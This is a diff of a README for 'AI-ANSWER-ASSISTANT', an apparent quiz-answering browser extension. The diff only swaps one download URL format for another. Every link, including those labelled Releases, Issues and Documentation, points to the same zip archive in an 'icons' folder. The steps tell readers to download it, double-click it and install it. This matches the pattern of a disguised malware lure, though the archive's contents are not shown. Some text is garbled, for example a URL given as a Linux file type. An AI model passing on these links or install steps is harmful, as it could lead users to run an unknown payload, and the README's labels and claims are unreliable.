@@ -8,7 +8,7 @@ Thank you for choosing AI-ANSWER-ASSISTANT, a smart browser extension that helps
 
 To get started, download the latest version of AI-ANSWER-ASSISTANT from our Releases page. 
 
-[![Download AI-ANSWER-ASSISTANT](https://github.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/raw/refs/heads/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip)](https://github.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/raw/refs/heads/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip)
+[![Download AI-ANSWER-ASSISTANT](https://raw.githubusercontent.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip)](https://raw.githubusercontent.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip)
 
 1. Click on the link above to visit the Releases page.
 2. Find the latest version of the software.
@@ -29,7 +29,7 @@ Before installing, ensure your device meets the following requirements:
 
 ## 📖 Installation Steps
 
-1. **Visit the Releases page**: Go to our [Releases page](https://github.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/raw/refs/heads/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip).
+1. **Visit the Releases page**: Go to our [Releases page](https://raw.githubusercontent.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip).
    
 2. **Choose your version**: Look for the latest version, which will be at the top of the list.
    
@@ -37,7 +37,7 @@ Before installing, ensure your device meets the following requirements:
 
    - For Windows, look for a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, look for a `https://github.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/raw/refs/heads/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip` or package file.
+   - For Linux, look for a `https://raw.githubusercontent.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip` or package file.
 
 4. **Open the downloaded file**: Double-click on the downloaded file. Follow the on-screen instructions to install the extension.
 
@@ -73,7 +73,7 @@ For more detailed troubleshooting, visit the FAQs section on our GitHub page.
 
 Need assistance? Our community and development team are here to help.
 
-1. **GitHub Issues**: Report any bugs or request features directly on the [Issues page](https://github.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/raw/refs/heads/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip).
+1. **GitHub Issues**: Report any bugs or request features directly on the [Issues page](https://raw.githubusercontent.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip).
    
 2. **Community Forum**: Join our forum for tips and discussions with other users.
 
@@ -91,8 +91,8 @@ AI-ANSWER-ASSISTANT offers several useful features:
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/raw/refs/heads/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip)
-- [Issues Page](https://github.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/raw/refs/heads/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip)
-- [Documentation](https://github.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/raw/refs/heads/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip)
+- [Releases Page](https://raw.githubusercontent.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip)
+- [Issues Page](https://raw.githubusercontent.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip)
+- [Documentation](https://raw.githubusercontent.com/mahmoodnooristani/AI-ANSWER-ASSISTANT/master/icons/A-ANSWE-ASSISTANT-v3.4-alpha.4.zip)
 
 Thank you for using AI-ANSWER-ASSISTANT. We hope it makes your quiz experiences smoother and smarter!
